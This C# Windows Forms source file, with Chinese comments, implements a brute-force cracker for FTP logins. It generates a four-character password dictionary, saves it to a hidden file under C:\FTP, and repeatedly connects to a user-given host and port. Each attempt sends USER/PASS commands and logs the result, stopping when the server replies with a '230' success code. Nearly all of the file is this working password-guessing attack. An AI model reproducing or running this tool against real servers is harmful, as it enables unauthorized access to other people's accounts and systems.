using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using MSTSCLib;
using System.Threading;
using System.Net;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Runtime.InteropServices;
using System.IO;

namespace WindowsFormsApplication1
{
    public partial class Form6 : Form
    {
        public Form6()
        {
            InitializeComponent();
        }

        private string _ip = string.Empty;
        private int _port = 0;
        static private Socket _socket = null;//_socket静态方便调用。
        private byte[] buffer = new byte[1024 * 1024 * 2];
        //IP和端口引用函数
        public void SocketClient(string socket_ip, int socket_port)
        {
            this._ip = socket_ip;
            this._port = socket_port;
        }
        static int Time_Out = 0;
        /// <summary>
        /// 开启服务,连接服务端
        /// </summary>
        public void StartClient()
        {
            try
            {
                //1.0 实例化套接字(IP4寻址地址,流式传输,TCP协议)
                _socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                //2.0 创建IP对象
                IPAddress address = IPAddress.Parse(_ip);
                //3.0 创建网络端口包括ip和端口
                IPEndPoint endPoint = new IPEndPoint(address, _port);
                //4.0 建立连接
                _socket.BeginConnect(endPoint, CallBackMethod, _socket);
                //阻塞当前线程             
                if (TimeoutObject.WaitOne(1000, false))//1s超时//StartHeck_flag为0时，破解按钮没被开启，能弹窗“网络正常”
                {
                    if (StartHeck_flag == 0)
                    {
                        MessageBox.Show("网络正常");
                    }
                    Time_Out = 0;
                }
                else
                {
                    if (StartHeck_flag == 0)
                    {
                        MessageBox.Show("连接超时");
                    }
                    Time_Out = 1;//超时标志
                }


                /*/6.0 像服务器发送消息

                    for (int i = 0; i < 10; i++)
                    {
                        Thread.Sleep(2000);
                        string sendMessage = string.Format("客户端发送的消息,当前时间{0}", DateTime.Now.ToString());
                        _socket.Send(Encoding.UTF8.GetBytes(sendMessage));
                        Console.WriteLine("像服务发送的消息:{0}", sendMessage);
                    }
    */
            }
            catch (Exception ex)
            {
                _socket.Close();
                MessageBox.Show(ex.Message);//远程主机强迫关闭了一个连接/无法连接/连接失败/通讯失败
            }
        }

        // Socket连接请求 
        private readonly ManualResetEvent TimeoutObject = new ManualResetEvent(false);
        //--异步回调方法       
        private void CallBackMethod(IAsyncResult asyncresult)
        {
            //使阻塞的线程继续        
            TimeoutObject.Set();
        }

        /// <summary>
        /// 登陆服务端
        /// </summary>
        public void StartLogIn()
        {
            try
            {
                Recieved();
                _socket.Send(Encoding.Default.GetBytes(string.Format("{0}{1}", "USER " + textBox1.Text, Environment.NewLine)));
                Recieved();
                _socket.Send(Encoding.Default.GetBytes(string.Format("{0}{1}", "PASS " + textBox2.Text, Environment.NewLine)));
                Recieved();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);//错误显示
            }

        }

        //用于StartHeck的专用LogIn
        public void StartLogIn(string LogIn_PassWord)
        {
            try
            {
                Recieved();
                _socket.Send(Encoding.Default.GetBytes(string.Format("{0}{1}", "USER " + textBox1.Text, Environment.NewLine)));
                Recieved();
                _socket.Send(Encoding.Default.GetBytes(string.Format("{0}{1}", "PASS " + LogIn_PassWord, Environment.NewLine)));
                Recieved();
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);//错误显示
            }

        }

        //FtpReturn_Str返回值
        static String FtpReturn_Str = null;
        public void Recieved()
        {
            Delay(500);
            //接收返回值
            byte[] buffer = new byte[1024 * 1024 * 3];
            //实际接收到的有效字节数
            int FtpReturn_len = _socket.Receive(buffer);//获取buffer（int）
            FtpReturn_Str = Encoding.UTF8.GetString(buffer, 0, FtpReturn_len);//FTPsocket返回值,UTF8编码buffer转为string格式
            if (StartHeck_flag == 0)
            {
                listBox1.Items.Add("连接返回值：" + FtpReturn_Str);
                listBox1.SelectedIndex = listBox1.Items.Count - 1;//滚动条添加
            }
            if (FtpReturn_Str[0] == '2' && FtpReturn_Str[1] == '3' && FtpReturn_Str[2] == '0' && StartHeck_flag == 1)
            {
                password_flag = 1;//用于密码破解的flag，为1则密码破解成功。
            }
        }

        //delay延时程序
        [DllImport("kernel32.dll")]
        static extern uint GetTickCount();
        static void Delay(uint ms)
        {
            uint start = GetTickCount();
            while (GetTickCount() - start < ms)
            {
                System.Windows.Forms.Application.DoEvents();
            }
        }

        //字典密码写入txt函数（非覆盖式写入）
        private void WriteHeck(string txt)
        {
            if (!System.IO.File.Exists(@"‪C:\FTP\password.txt"))
            {
                //没有则创建这个文件
                FileStream fs1 = new FileStream(@"C:\FTP\password.txt", FileMode.Create, FileAccess.Write);//创建写入文件                
                //System.IO.File.SetAttributes(@"‪C:\FTP\password.txt", FileAttributes.Hidden);//设置文件属性为隐藏
                StreamWriter sw = new StreamWriter(fs1);
                sw.WriteLine(txt);//开始写入值
                sw.Close();
                fs1.Close();
            }
            else
            {
                FileStream fs = new FileStream(@"C:\FTP\password.txt", FileMode.Append, FileAccess.Write);
                System.IO.File.SetAttributes(@"C:\FTP\password.txt", FileAttributes.Hidden);
                StreamWriter sr = new StreamWriter(fs);
                sr.WriteLine(txt);//开始写入值
                sr.Close();
                fs.Close();

            }

        }

        //字典密码读入txt函数
        private void ReadHeck()
        {
            if (!System.IO.File.Exists(@"C:\FTP\password.txt"))
            {
                HeckDiction_total = "0000";
            }
            else
            {
                StreamReader sr = new StreamReader(@"C:\FTP\password.txt", Encoding.Default);
                string txt_read = sr.ReadLine();
                if (txt_read == null)
                {
                    HeckDiction_total = "0000";
                }
                else
                {
                    while (!sr.EndOfStream)
                    {
                        txt_read = sr.ReadLine();
                        HeckDiction_total = txt_read;
                    }
                }
                sr.Close();
            }
        }

        static string HeckDiction_total = "0000";
        //自动生成字典序密码
        private void HeckDiction(int Diction_total)
        {
            ReadHeck();//先判断是否有字典存在
            char HeckDiction_0 = HeckDiction_total[0];//左1位
            char HeckDiction_1 = HeckDiction_total[1];//左2位
            char HeckDiction_2 = HeckDiction_total[2];//左3位
            char HeckDiction_3 = HeckDiction_total[3];//左4位

            int flag_3 = 0;//左4位，进位标志
            int flag_2 = 0;//左3位，进位标志
            int flag_1 = 0;//左2位，进位标志

            while (Diction_total > 0)
            {
                //左4
                if (HeckDiction_3 == 'c')
                {
                    flag_3 = 1;
                    HeckDiction_3 = '0';
                }
                else if (HeckDiction_3 == '9')
                {
                    HeckDiction_3 = 'a';
                }
                else
                {
                    HeckDiction_3 += '2';
                    HeckDiction_3 -= '1';
                }

                //左3
                if (flag_3 == 1)
                {
                    if (HeckDiction_2 == 'c')
                    {
                        flag_2 = 1;
                        HeckDiction_2 = '0';
                    }
                    else if (HeckDiction_2 == '9')
                    {
                        HeckDiction_2 = 'a';
                    }
                    else
                    {
                        HeckDiction_2 += '2';
                        HeckDiction_2 -= '1';
                    }
                    flag_3 = 0;
                }

                //左2
                if (flag_2 == 1)
                {
                    if (HeckDiction_1 == 'c')
                    {
                        flag_1 = 1;
                        HeckDiction_1 = '0';
                    }
                    else if (HeckDiction_1 == '9')
                    {
                        HeckDiction_1 = 'a';
                    }
                    else
                    {
                        HeckDiction_1 += '2';
                        HeckDiction_1 -= '1';
                    }
                    flag_2 = 0;
                }

                //左1
                if (flag_1 == 1)
                {
                    if (HeckDiction_0 == 'c')
                    {

                    }
                    else if (HeckDiction_0 == '9')
                    {
                        HeckDiction_0 = 'a';
                    }
                    else
                    {
                        HeckDiction_0 += '2';
                        HeckDiction_0 -= '1';
                    }
                }

                string HeckDiction_flag = "";//用于组成密码的临时flag
                HeckDiction_flag = HeckDiction_0.ToString() + HeckDiction_1.ToString() + HeckDiction_2.ToString() + HeckDiction_3.ToString();
                HeckDiction_total = HeckDiction_flag;//flag赋值给目标

                listBox1.Items.Add("密码生成：" + HeckDiction_total);
                listBox1.SelectedIndex = listBox1.Items.Count - 1;//滚动条添加
                WriteHeck(HeckDiction_total);
                Diction_total -= 1;
            }

        }

        //开始字典序破解
        static int password_flag = 0;
        static int StartHeck_flag = 0;
        private void Start_HeckDiction()
        {
            FtpReturn_Str = "";//FTP返回值为null，避免前面按钮操作导致的文本出错
            StartHeck_flag = 1;//破解flag置为1，防止跳窗“连接正常”         
            StreamReader sr = new StreamReader(@"C:\FTP\password.txt", Encoding.Default);
            string txt_read = sr.ReadLine();

            while (txt_read != null)
            {
                Form6 client = new Form6();
                client.SocketClient(textBox3.Text, int.Parse(textBox4.Text));
                client.StartClient();
                StartLogIn(txt_read);
                if (password_flag == 1)//破解成功，则写入
                {
                    //WriteHeck(txt_read);
                    password_flag = 0;
                    listBox1.Items.Add("密码：" + txt_read + "，尝试破解成功\r\n");
                    listBox1.SelectedIndex = listBox1.Items.Count - 1;//滚动条添加
                    break;
                }
                else
                {
                    listBox1.Items.Add("密码：" + txt_read + "，尝试破解失败\r\n");
                    listBox1.SelectedIndex = listBox1.Items.Count - 1;//滚动条添加
                }
                client.Close();
                txt_read = sr.ReadLine();//读入txt密码本的下一行
            }
            MessageBox.Show("破解完毕（破解已停止）");
        }

       
        private void Form6_Load(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            Start_HeckDiction();
        }
    }
}
